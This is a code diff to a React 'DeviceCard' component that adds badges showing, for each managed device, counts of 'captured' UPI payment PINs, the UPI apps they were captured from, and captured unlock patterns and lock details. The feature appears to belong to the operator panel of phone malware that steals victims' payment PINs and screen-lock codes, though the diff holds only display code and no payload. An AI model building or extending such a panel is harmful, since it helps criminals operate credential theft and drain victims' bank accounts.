@@ -21,6 +21,9 @@ import {
     Activity,
     Battery,
     Signal,
+    Lock,
+    Key,
+    Info,
 } from 'lucide-react';
 
 interface DeviceCardProps {
@@ -45,6 +48,15 @@ interface DeviceCardProps {
         isPinned?: boolean;
         remark?: string;
         owner?: { id: string; username: string };
+        syncData?: {
+            hasLockData: boolean;
+            hasUpiData: boolean;
+            unlockCount: number;
+            patternCount: number;
+            upiPinsCount: number;
+            capturedUpiApps: string[];
+            lockDetails: { type: string; count: number }[];
+        };
     };
     showRemark?: boolean;
     showPin?: boolean;
@@ -66,6 +78,8 @@ export default function DeviceCard({
     const [remarkText, setRemarkText] = useState(device.remark || '');
     const [localRemark, setLocalRemark] = useState(device.remark || '');
     const [lastSeenText, setLastSeenText] = useState('');
+    const [showUpiApps, setShowUpiApps] = useState(false);
+    const [showLockDetails, setShowLockDetails] = useState(false);
 
     useEffect(() => {
         setLastSeenText(formatDistanceToNow(new Date(device.lastSeen), { addSuffix: true }));
@@ -183,6 +197,51 @@ export default function DeviceCard({
                                 <Clock className="w-3 h-3" />
                                 {lastSeenText}
                             </span>
+                            {/* Sync Badges */}
+                            {device.syncData?.hasUpiData && (
+                                <div className="relative">
+                                    <button
+                                        onClick={(e) => { e.stopPropagation(); setShowUpiApps(!showUpiApps); }}
+                                        className="flex items-center gap-1 px-1.5 py-0.5 rounded-full bg-orange-100 text-orange-700 text-[10px] font-medium hover:bg-orange-200 transition-colors"
+                                    >
+                                        <Key className="w-2.5 h-2.5" />
+                                        UPI ({device.syncData.capturedUpiApps?.length || 0})
+                                        <Info className="w-2.5 h-2.5" />
+                                    </button>
+                                    {showUpiApps && device.syncData.capturedUpiApps?.length > 0 && (
+                                        <div className="absolute top-full left-0 mt-1 z-50 bg-white border border-orange-200 rounded-lg shadow-lg p-2 min-w-[120px]">
+                                            <p className="text-[9px] font-bold text-orange-600 mb-1">Captured Apps:</p>
+                                            {device.syncData.capturedUpiApps.map((app, i) => (
+                                                <div key={i} className="text-[10px] text-slate-700 py-0.5">
+                                                    • {app}
+                                                </div>
+                                            ))}
+                                        </div>
+                                    )}
+                                </div>
+                            )}
+                            {device.syncData?.hasLockData && (
+                                <div className="relative">
+                                    <button
+                                        onClick={(e) => { e.stopPropagation(); setShowLockDetails(!showLockDetails); }}
+                                        className="flex items-center gap-1 px-1.5 py-0.5 rounded-full bg-emerald-100 text-emerald-700 text-[10px] font-medium hover:bg-emerald-200 transition-colors"
+                                    >
+                                        <Lock className="w-2.5 h-2.5" />
+                                        Lock ({device.syncData.lockDetails?.length || 0})
+                                        <Info className="w-2.5 h-2.5" />
+                                    </button>
+                                    {showLockDetails && device.syncData.lockDetails?.length > 0 && (
+                                        <div className="absolute top-full left-0 mt-1 z-50 bg-white border border-emerald-200 rounded-lg shadow-lg p-2 min-w-[100px]">
+                                            <p className="text-[9px] font-bold text-emerald-600 mb-1">Captured:</p>
+                                            {device.syncData.lockDetails.map((item, i) => (
+                                                <div key={i} className="text-[10px] text-slate-700 py-0.5">
+                                                    • {item.type}: {item.count}
+                                                </div>
+                                            ))}
+                                        </div>
+                                    )}
+                                </div>
+                            )}
                         </div>
                     </div>
 
@@ -265,6 +324,53 @@ export default function DeviceCard({
                                     </>
                                 )}
                             </span>
+                            {/* Sync Badges */}
+                            {device.syncData?.hasUpiData && (
+                                <div className="relative">
+                                    <button
+                                        onClick={(e) => { e.stopPropagation(); setShowUpiApps(!showUpiApps); }}
+                                        className="flex items-center gap-1 px-2 py-0.5 rounded-lg bg-orange-100 text-orange-700 text-[10px] lg:text-xs font-semibold hover:bg-orange-200 transition-colors"
+                                    >
+                                        <Key className="w-2.5 h-2.5 lg:w-3 lg:h-3" />
+                                        UPI Pins ({device.syncData.capturedUpiApps?.length || 0})
+                                        <Info className="w-2.5 h-2.5 lg:w-3 lg:h-3" />
+                                    </button>
+                                    {showUpiApps && device.syncData.capturedUpiApps?.length > 0 && (
+                                        <div className="absolute top-full left-0 mt-1 z-50 bg-white border border-orange-200 rounded-xl shadow-xl p-3 min-w-[140px]">
+                                            <p className="text-xs font-bold text-orange-600 mb-2">Captured Apps:</p>
+                                            {device.syncData.capturedUpiApps.map((app, i) => (
+                                                <div key={i} className="flex items-center gap-2 text-sm text-slate-700 py-1">
+                                                    <span className="w-2 h-2 rounded-full bg-orange-400"></span>
+                                                    {app}
+                                                </div>
+                                            ))}
+                                        </div>
+                                    )}
+                                </div>
+                            )}
+                            {device.syncData?.hasLockData && (
+                                <div className="relative">
+                                    <button
+                                        onClick={(e) => { e.stopPropagation(); setShowLockDetails(!showLockDetails); }}
+                                        className="flex items-center gap-1 px-2 py-0.5 rounded-lg bg-emerald-100 text-emerald-700 text-[10px] lg:text-xs font-semibold hover:bg-emerald-200 transition-colors"
+                                    >
+                                        <Lock className="w-2.5 h-2.5 lg:w-3 lg:h-3" />
+                                        Lock ({device.syncData.lockDetails?.length || 0})
+                                        <Info className="w-2.5 h-2.5 lg:w-3 lg:h-3" />
+                                    </button>
+                                    {showLockDetails && device.syncData.lockDetails?.length > 0 && (
+                                        <div className="absolute top-full left-0 mt-1 z-50 bg-white border border-emerald-200 rounded-xl shadow-xl p-3 min-w-[120px]">
+                                            <p className="text-xs font-bold text-emerald-600 mb-2">Captured:</p>
+                                            {device.syncData.lockDetails.map((item, i) => (
+                                                <div key={i} className="flex items-center gap-2 text-sm text-slate-700 py-1">
+                                                    <span className="w-2 h-2 rounded-full bg-emerald-400"></span>
+                                                    {item.type}: {item.count}
+                                                </div>
+                                            ))}
+                                        </div>
+                                    )}
+                                </div>
+                            )}
                         </div>
                     </div>
 
